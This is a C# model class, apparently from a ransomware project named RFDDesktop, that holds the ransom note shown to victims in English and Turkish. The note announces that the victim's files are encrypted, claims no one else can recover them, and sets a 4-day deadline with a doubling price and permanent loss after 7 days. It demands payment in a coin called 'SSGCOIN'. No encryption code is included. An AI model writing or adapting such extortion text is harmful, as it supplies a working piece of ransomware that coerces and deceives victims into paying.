using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace RFDDesktop.Model
{
    public class Message
    {
        public string TitleEN
        {
            get
            {
                return $@"Ooops, your files have been encrypted!";
            }
        }
        public string DescriptionEN
        {
            get
            {
                return @"
What Happened to My Computer?
All your files are encrypted. Most of your documents, photos, videos, databases and other files are now inaccessible as they are encrypted. Maybe you are busy looking for a way to recover your files but don't waste your time. No one can recover your files without our decryption service.

Can I Recover My Files?
Certainly. We guarantee that you can recover all your files safely and easily. But you don't have that much time. If you want to decrypt your files, you have to pay. You only have 4 days to send the payment. After that, the price will double. Also, if you don't pay within 7 days, you won't be able to recover your file forever.

How Can I Pay?
Payment is only accepted with SSGCOIN. Please check the current SSGCOIN price and buy some SSGCOIN. Send the correct amount to the address specified in this window.";
            }
        }


        public string TitleTR { get; set; }
        public string DescriptionTR
        {
            get
            {
                return @"
Bilgisayarıma Ne Oldu?
Bütün dosyalarınız şifrelendi. Belgeleriniz, fotoğraflarınız, videolarınız, veritabanlarınız ve diğer dosyalarınızın çoğu şifreli olduğu için artık erişilemiyor. Belki de dosyalarınızı kurtarmanın bir yolunu aramakla meşgulsünüz ama zamanınızı boşa harcamayın. Şifre çözme hizmetimiz olmadan hiç kimse dosyalarınızı kurtaramaz.

Dosyalarımı Kurtarabilir miyim?
Elbette. Tüm dosyalarınızı güvenli ve kolay bir şekilde kurtarabileceğinizi garanti ediyoruz. Ama o kadar yeterli zamanınız yok. Dosyalarınızın şifresini çözmek istiyorsanız, ödeme yapmanız gerekiyor. Ödemeyi göndermek için sadece 4 gününüz var. Bundan sonra fiyat iki katına çıkacak. Ayrıca 7 gün içinde ödeme yapmazsanız, dosyanızı sonsuza kadar kurtaramazsınız.

Nasıl Ödeme Yapabilirim?
Ödeme sadece SSGCOIN ile kabul edilir. Lütfen mevcut SSGCOIN fiyatını kontrol edin ve biraz SSGCOIN satın alın. Bu pencerede belirtilen adrese doğru miktarı gönderin.
";
            }
        }


    }
}
